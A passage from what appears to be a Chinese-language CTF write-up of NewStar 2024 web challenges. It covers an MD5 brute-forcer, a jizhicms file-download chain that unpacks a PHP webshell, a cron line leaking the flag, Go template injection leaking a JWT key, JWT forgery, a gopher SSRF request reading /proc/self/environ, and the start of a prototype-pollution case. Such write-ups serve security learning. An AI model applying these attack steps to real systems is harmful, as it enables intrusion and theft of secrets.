</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>    char <span style=color:#f92672>=</span> get_flag_char(i)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> char:
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>+=</span> char
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;å½“å‰æƒ…å†µ: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;å·²ç»“æŸ&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;æœ€ç»ˆæƒ…å†µ: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h3 id=chocolate>chocolate</h3><p>å¼€å¤´ç›´æ¥dirsearchæ‰«äº†ä¸€é</p><p><img alt=44 loading=lazy src=/posts/ctf/newstar2024/44.png></p><p>ç¬¬ä¸€å±‚æ•°å­—æˆªæ–­ç»•è¿‡</p><p><img alt=45 loading=lazy src=/posts/ctf/newstar2024/45.png></p><p>ç¬¬äºŒå±‚md5</p><p><img alt=46 loading=lazy src=/posts/ctf/newstar2024/46.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è¦å¯»æ‰¾çš„å‰äº”ä½å“ˆå¸Œ</span>
</span></span><span style=display:flex><span>target_prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;8031b&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># ä»è¿™é‡Œå¼€å§‹ä½ å¯ä»¥å®šä¹‰è¦æœç´¢çš„èŒƒå›´</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10000000</span>):  <span style=color:#75715e># ä½ å¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´è¿™ä¸ªèŒƒå›´</span>
</span></span><span style=display:flex><span>    next_level <span style=color:#f92672>=</span> str(i)  <span style=color:#75715e># å¯ä»¥å°è¯•å…¶ä»–ç±»å‹çš„è¾“å…¥</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># è®¡ç®— MD5 å“ˆå¸Œ</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> hashlib<span style=color:#f92672>.</span>md5(next_level<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()<span style=color:#f92672>.</span>startswith(target_prefix):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;æ‰¾åˆ°çš„å€¼: </span><span style=color:#e6db74>{</span>next_level<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;no&#34;</span>)
</span></span></code></pre></div><p>ç¬¬ä¸‰å±‚å¤§å°å†™ç»•è¿‡bpå‘åŒ…</p><p><img alt=47 loading=lazy src=/posts/ctf/newstar2024/47.png></p><p>æœ€åä¸€å±‚ç›´æ¥bpfuzzä¸€ä¸‹</p><p><img alt=48 loading=lazy src=/posts/ctf/newstar2024/48.png></p><h3 id=ezcmssså¤ç°>ezcmsss(å¤ç°)</h3><p>ç”¨diræ‰«ç›®å½•å¯ä»¥å‘ç°æœ‰www.zipï¼Œä¸‹è½½ä¸‹æ¥é‡Œé¢æœ‰åå°ç®¡ç†çš„è´¦æˆ·å’Œå¯†ç <code>admin_name=jizhicms1498 & admin_pass=4oP4fB51r5</code></p><p>åå°ç•Œé¢åœ¨<code>admin.php</code>é‡Œç™»å…¥åå°ï¼Œå‘ç° jizhicms v1.9.5 æœ‰ä¸€ä¸ªç®¡ç†ç•Œé¢çš„ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæ’ä»¶é‡Œé¢åªæœ‰ä¸€ä¸ªä¸èƒ½å‡ºç½‘ï¼Œ<del>æˆ‘åˆ°è¿™é‡Œå½“æ—¶å°±å¡ä½äº†</del>å®é™…æµç¨‹æ˜¯éœ€è¦åœ¨å°†<code>.zip</code>æ–‡ä»¶ä¸Šä¼ åˆ°é¢˜ç›®å®¹å™¨é‡Œï¼Œç„¶åé€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´æœ¬åœ°ä¸‹è½½è§£å‹</p><p>å…¶ä¸­çš„ä¸€ç§æ˜¯åœ¨<code>æ ç›®ç®¡ç†-æ ç›®åˆ—è¡¨-æ–°å¢æ ç›®</code>ä¸­å¢åŠ é™„ä»¶ï¼Œä¸Šä¼ æ„é€ å¥½çš„phpğŸçš„å‹ç¼©åŒ…</p><p>ä¸Šä¼ çš„æ—¶å€™bpæˆªå–ç„¶åè·å–å‹ç¼©åŒ…çš„å†…å®¹</p><p><img alt=50 loading=lazy src=/posts/ctf/newstar2024/50.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>/static/upload/file/20241104/1730714912409405.zip
</span></span></code></pre></div><p>ç„¶åå°±å¯ä»¥æŒ‰ç…§ç½‘ä¸Šæ³„éœ²çš„æ¼æ´æ¥æ‰“äº†</p><p><img alt=51 loading=lazy src=/posts/ctf/newstar2024/51.png></p><p><code>filepath</code>çš„å‚æ•°éšæ„ï¼Œç„¶åæŠŠåˆšæ‰æŠ“åˆ°çš„zipè·¯å¾„è´´ä¸Šå»</p><p>ç„¶åå¯¹æ–‡ä»¶è¿›è¡Œè§£å‹</p><p><img alt=52 loading=lazy src=/posts/ctf/newstar2024/52.png></p><p>æœ€åè·Ÿè¿›<code>/A/exts/ma.php</code>è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img alt=53 loading=lazy src=/posts/ctf/newstar2024/53.png></p><p>æ²¡æ³¨æ„ç¾¤é‡Œçš„æé†’æ˜¯ä¸å‡ºç½‘çš„ï¼Œä¸€ç›´åœ¨æƒ³ç€å‡ºç½‘ï¼Œè§£é¢˜æ€è·¯å’Œæˆ‘æƒ³çš„åŸºæœ¬ä¸€è‡´ã€‚</p><h3 id=éšè—çš„å¯†ç å¤ç°>éšè—çš„å¯†ç (å¤ç°)</h3><p>javaè¿˜æ²¡ä¼šï¼Œå­¦ä¸€ä¸‹ã€‚æ‰¾ä¸åˆ°å¯†ç ç›®å½•æ‰«æ</p><p><img alt=54 loading=lazy src=/posts/ctf/newstar2024/54.png></p><p>å¯ä»¥æ‰«åˆ° <code>env</code> å’Œ <code>jolokia</code> ç«¯ç‚¹</p><p><img alt=55 loading=lazy src=/posts/ctf/newstar2024/55.png></p><p>å¯ä»¥æ‰¾åˆ° <code>caef11.passwd</code> å±æ€§æ˜¯éšè—çš„</p><p><img alt=56 loading=lazy src=/posts/ctf/newstar2024/56.png></p><p>è¯»åˆ°å¯†ç åï¼Œæ ¹æ®é¢˜ç›®æè¿°å’Œå±æ€§çš„åå­—å¯å¾—ç”¨æˆ·åä¸º <code>caef11</code></p><p>é€šè¿‡å†™å®šæ—¶ä»»åŠ¡ï¼ˆè®¡åˆ’ä»»åŠ¡ï¼‰çš„æ–¹å¼ï¼Œä»¥ flag ä¸ºæ–‡ä»¶ååœ¨æ ¹ç›®å½•åˆ›å»ºæ–°æ–‡ä»¶ï¼Œé€šè¿‡ <code>ls</code> æŸ¥çœ‹ flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>*/1 <span style=font-style:italic>* *</span> <span style=font-style:italic>* *</span> root cat /flag | xargs -I {} touch /{}
</span></span></code></pre></div><p>å…·ä½“å°±ä¸ä¼šå†™äº†ï¼Œä¸ä¼šjavaçš„æœ‰è‹¦å¤´äº†ï¼Œä¹‹åæœ‰ç©ºä¸€å®šå­¦ã€‚</p><h3 id=pangbai-è¿‡å®¶å®¶4å¤ç°>PangBai è¿‡å®¶å®¶ï¼ˆ4ï¼‰(å¤ç°)</h3><p>hint:You just need to read main.go for solving this challenge.</p><p>ç›´æ¥å®šä½<code>main.go</code>æ–‡ä»¶ï¼Œå‰ç«¯åœ¨/eyeè·¯ç”±ä¸Šå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œå®šä½ä¸€ä¸‹å…³é”®ä»£ç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#a6e22e>tmplStr</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Replace</span>(string(<span style=color:#a6e22e>content</span>), <span style=color:#e6db74>&#34;%s&#34;</span>, <span style=color:#a6e22e>input</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>tmpl</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>template</span>.<span style=color:#a6e22e>New</span>(<span style=color:#e6db74>&#34;eye&#34;</span>).<span style=color:#a6e22e>Parse</span>(<span style=color:#a6e22e>tmplStr</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// render template</span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>helper</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>Helper</span>{<span style=color:#a6e22e>User</span>: <span style=color:#a6e22e>user</span>, <span style=color:#a6e22e>Config</span>: <span style=color:#a6e22e>config</span>}
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>err</span> = <span style=color:#a6e22e>tmpl</span>.<span style=color:#a6e22e>Execute</span>(<span style=color:#a6e22e>w</span>, <span style=color:#a6e22e>helper</span>)
</span></span></code></pre></div><p>å°† <code>content</code> ä¸­çš„æ‰€æœ‰ <code>"%s"</code> æ›¿æ¢ä¸º <code>input</code> å­—ç¬¦ä¸²ï¼Œä»è€Œç”Ÿæˆæœ€ç»ˆçš„æ¨¡æ¿å­—ç¬¦ä¸² <code>tmplStr</code></p><p>å®šä¹‰å¹¶å®ä¾‹åŒ– <code>Helper</code> ç»“æ„ä½“ï¼Œå°† <code>user</code> å’Œ <code>config</code> æ•°æ®ç»“æ„ä¼ å…¥ï¼Œç”¨äºåç»­çš„æ¨¡æ¿æ¸²æŸ“ã€‚è¿™ä¸ª <code>Helper</code> ç»“æ„ä½“å……å½“æ¨¡æ¿ä¸­çš„æ•°æ®æº</p><p><code>Execute</code> æ–¹æ³•ç”¨äºå°† <code>helper</code> ä¸­çš„æ•°æ®æ¸²æŸ“è¿›æ¨¡æ¿ <code>tmpl</code> ä¸­ï¼Œå¹¶è¾“å‡ºåˆ° <code>w</code>ï¼ˆä¾‹å¦‚ <code>http.ResponseWriter</code>ï¼‰ã€‚è¿™é‡Œä¼šå°† <code>helper</code> ä¸­çš„å­—æ®µï¼ˆå¦‚ <code>User</code>ã€<code>Config</code> ç­‰ï¼‰æ¸²æŸ“åˆ°æ¨¡æ¿ä¸­è¢«å ä½ç¬¦å¼•ç”¨çš„ä½ç½®ã€‚</p><p>å¼•ç”¨å®˜æ–¹çš„è§£é‡Š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>tmpl.Execute å‡½æ•°ç”¨äºå°† tmpl å¯¹è±¡ä¸­çš„æ¨¡æ¿å­—ç¬¦ä¸²è¿›è¡Œæ¸²æŸ“ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯ä¸€ä¸ª Writer å¯¹è±¡ï¼Œåé¢æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œåœ¨æ¨¡æ¿å­—ç¬¦ä¸²ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ {{ . }} è·å–æ•´ä¸ªä¸Šä¸‹æ–‡ï¼Œæˆ–ä½¿ç”¨ {{ .A.B }} è¿›è¡Œå±‚çº§è®¿é—®ã€‚è‹¥ä¸Šä¸‹æ–‡ä¸­å«æœ‰å‡½æ•°ï¼Œä¹Ÿæ”¯æŒ {{ .Func &#34;param&#34; }} çš„æ–¹å¼ä¼ å…¥å˜é‡ã€‚å¹¶ä¸”è¿˜æ”¯æŒç®¡é“ç¬¦è¿ç®—ã€‚
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>åœ¨æœ¬é¢˜ä¸­ï¼Œç”±äº utils.go å®šä¹‰çš„ Stringer å¯¹è±¡ä¸­çš„ String æ–¹æ³•ï¼Œå¯¹ç»§æ‰¿ä»–çš„æ¯ä¸€ä¸ª structï¼Œåœ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶éƒ½ä¼šè¿”å› [struct]ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨ {{ . }} è¿”å›å…¨å±€çš„ä¸Šä¸‹æ–‡ç»“æ„ä¼šè¿”å› [struct].
</span></span></code></pre></div><p>åœ¨/eyeè·¯ç”±ä¸‹ï¼Œå¯ä»¥è¿½æº¯<code>Helper</code>å’Œ<code>Config</code>ä¸¤ä¸ªç»“æ„ä½“ï¼Œå¯ä»¥å°è¯•è·å–Jwt</p><p><img alt=61 loading=lazy src=/posts/ctf/newstar2024/61.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>AYZowY3EtOmSZpn3Zh0TaGCMY72SMDSr2LvK5a3zYc7OD2cNpN0KkvnsClLkLJ95
</span></span></code></pre></div><p>ç„¶åçœ‹å¦å¤–ä¸€ä¸ªè·¯ç”±/favorite</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>routeFavorite</span>(<span style=color:#a6e22e>w</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>ResponseWriter</span>, <span style=color:#a6e22e>r</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Method</span> <span style=color:#f92672>==</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>MethodPut</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// ensure only localhost can access</span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>requestIP</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>RemoteAddr</span>[:<span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>LastIndex</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>RemoteAddr</span>, <span style=color:#e6db74>&#34;:&#34;</span>)]
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;Request IP:&#34;</span>, <span style=color:#a6e22e>requestIP</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>requestIP</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>requestIP</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;[::1]&#34;</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>WriteHeader</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusForbidden</span>)
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Write</span>([]byte(<span style=color:#e6db74>&#34;Only localhost can access&#34;</span>))
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>_</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Cookie</span>(<span style=color:#e6db74>&#34;token&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>o</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>validateJwt</span>(<span style=color:#a6e22e>token</span>.<span style=color:#a6e22e>Value</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Write</span>([]byte(<span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>()))
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>o</span>.<span style=color:#a6e22e>Name</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;PangBai&#34;</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>WriteHeader</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusAccepted</span>)
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Write</span>([]byte(<span style=color:#e6db74>&#34;Hello, PangBai!&#34;</span>))
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>o</span>.<span style=color:#a6e22e>Name</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;Papa&#34;</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>WriteHeader</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusForbidden</span>)
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Write</span>([]byte(<span style=color:#e6db74>&#34;You cannot access!&#34;</span>))
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>body</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ioutil</span>.<span style=color:#a6e22e>ReadAll</span>(<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Body</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>			<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Error</span>(<span style=color:#a6e22e>w</span>, <span style=color:#e6db74>&#34;error&#34;</span>, <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusInternalServerError</span>)
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>config</span>.<span style=color:#a6e22e>SignaturePath</span> = string(<span style=color:#a6e22e>body</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>WriteHeader</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>)
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>w</span>.<span style=color:#a6e22e>Write</span>([]byte(<span style=color:#e6db74>&#34;ok&#34;</span>))
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>	}
</span></span></code></pre></div><p>ç½‘é¡µçš„å³ä¸‹è§’æ˜¯ä¸ªæ–‡ä»¶è¯»çš„ç»“æœï¼Œæ–‡ä»¶è·¯å¾„é»˜è®¤ä¸º <code>config.SignaturePath</code> å³ <code>./sign.txt</code> çš„å†…å®¹ã€‚</p><p>ä»£ç è¯´æ˜äº†å¦‚æœæ˜¯<code>PUT</code>è¯·æ±‚å¯ä»¥è¿›å…¥ä¿®æ”¹<code>config.SignaturePath</code> çš„å€¼ï¼Œä½†æ˜¯éœ€è¦è®©nameå€¼ä¸º<code>Papa</code>æ‰èƒ½è¿›è¡Œ</p><p>è¿™é‡Œå…ˆæ„é€ ä¸€ä¸ªjwtä¼ªé€ (æ³¨æ„å¯†é’¥ä¸è¦å¸¦å¤šä½™çš„ç©ºæ ¼)</p><p><img alt=65 loading=lazy src=/posts/ctf/newstar2024/65.png></p><p>äºæ˜¯è§£é¢˜æ€è·¯ï¼šåˆ©ç”¨æ³„éœ²çš„ <code>JwtKey</code> ä¼ªé€  Cookieï¼Œå¯¹ <code>/favorite</code> å‘èµ· PUT è¯·æ±‚ä»¥ä¿®æ”¹ <code>config.SignaturePath</code>ï¼Œç„¶åè®¿é—® <code>/favorite</code> è·å–æ–‡ä»¶è¯»çš„å†…å®¹ã€‚åŒæ—¶é¢˜ç›®è¿˜ç»™äº†é™åˆ¶å¿…é¡»æ¥è‡ª<code>127.0.0.1</code></p><p>å®šä½ä»£ç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#66d9ef>func</span> (<span style=color:#a6e22e>c</span> <span style=color:#a6e22e>Helper</span>) <span style=color:#a6e22e>Curl</span>(<span style=color:#a6e22e>url</span> <span style=color:#66d9ef>string</span>) <span style=color:#66d9ef>string</span> {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;Curl:&#34;</span>, <span style=color:#a6e22e>url</span>)
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>cmd</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>exec</span>.<span style=color:#a6e22e>Command</span>(<span style=color:#e6db74>&#34;curl&#34;</span>, <span style=color:#e6db74>&#34;-fsSL&#34;</span>, <span style=color:#e6db74>&#34;--&#34;</span>, <span style=color:#a6e22e>url</span>)
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>_</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>cmd</span>.<span style=color:#a6e22e>CombinedOutput</span>()
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;Error: curl:&#34;</span>, <span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;error&#34;</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;ok&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>Curl</code> çš„æ–¹æ³•ï¼Œå®ƒå±äº <code>Helper</code> ç»“æ„ä½“ï¼Œå¹¶é€šè¿‡è°ƒç”¨ <code>curl</code> å‘½ä»¤å»è®¿é—®æŒ‡å®šçš„ URLã€‚å®ƒçš„ä¸»è¦åŠŸèƒ½æ˜¯å‘é€ä¸€ä¸ª HTTP è¯·æ±‚å¹¶è¿”å›ç»“æœã€‚<code>--</code> çš„å­˜åœ¨ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•è¿›è¡Œä»»ä½•å‘½ä»¤æ³¨å…¥æˆ–é€‰é¡¹æ§åˆ¶ï¼Œä½† curl å‘½ä»¤å¹¶ä¸æ˜¯åªèƒ½å‘èµ· HTTP è¯·æ±‚ï¼Œå®ƒä¹Ÿæ”¯æŒå…¶å®ƒå¾ˆå¤šçš„åè®®ï¼Œä¾‹å¦‚ FTPã€Gopher ç­‰ï¼Œå…¶ä¸­ Gopher åè®®èƒ½æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ã€‚</p><p><img alt=62 loading=lazy src=/posts/ctf/newstar2024/62.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>PUT /favorite HTTP/1.1
</span></span><span style=display:flex><span>Host: localhost:8000
</span></span><span style=display:flex><span>Content-Type: text/plain
</span></span><span style=display:flex><span>Cookie: token=
</span></span><span style=display:flex><span>Content-Length: 18
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/proc/self/environ
</span></span></code></pre></div><p>ç„¶åæ„é€  PUT è¯·æ±‚åŸå§‹æŠ¥æ–‡ï¼ŒBody å†…å®¹ä¸ºæƒ³è¦è¯»å–çš„æ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œè¯»å–ç¯å¢ƒå˜é‡</p><p><img alt=63 loading=lazy src=/posts/ctf/newstar2024/63.png></p><p>è¯»å–ä¹‹åå‰å»å¯ä»¥æŸ¥çœ‹flag</p><p><img alt=64 loading=lazy src=/posts/ctf/newstar2024/64.png></p><h3 id=ezpolluteå¤ç°>ezpollute(å¤ç°)</h3><p>çœ‹ä¸€ä¸‹éƒ¨ç½²æ–‡ä»¶Node.js ç‰ˆæœ¬ä¸º 16ï¼Œä½¿ç”¨äº† <code>node-dev</code> çƒ­éƒ¨ç½²å¯åŠ¨</p><p>åœ¨<code>index.js</code>é‡Œé¢çš„<code>/config</code>è·¯ç”±ä¸‹å­˜åœ¨<code>merge</code>,å¤§æ¦‚ç‡å­˜åœ¨åŸç”Ÿé“¾æ±¡æŸ“</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>finalConfig</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>clone</span>(<span style=color:#a6e22e>defaultWaterMarkConfig</span>)
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>merge</span>(<span style=color:#a6e22e>finalConfig</span>, <span style=color:#a6e22e>userConfig</span>)
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>writeFileSync</span>(<span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#39;uploads&#39;</span>, <span style=color:#a6e22e>userID</span>, <span style=color:#e6db74>&#39;config.json&#39;</span>), <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>(<span style=color:#a6e22e>finalConfig</span>))
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ctx</span>.<span style=color:#a6e22e>body</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>code</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>msg</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Config updated successfully&#39;</span>,
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ctx</span>.<span style=color:#a6e22e>body</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>code</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>msg</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Some error occurred&#39;</span>,
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
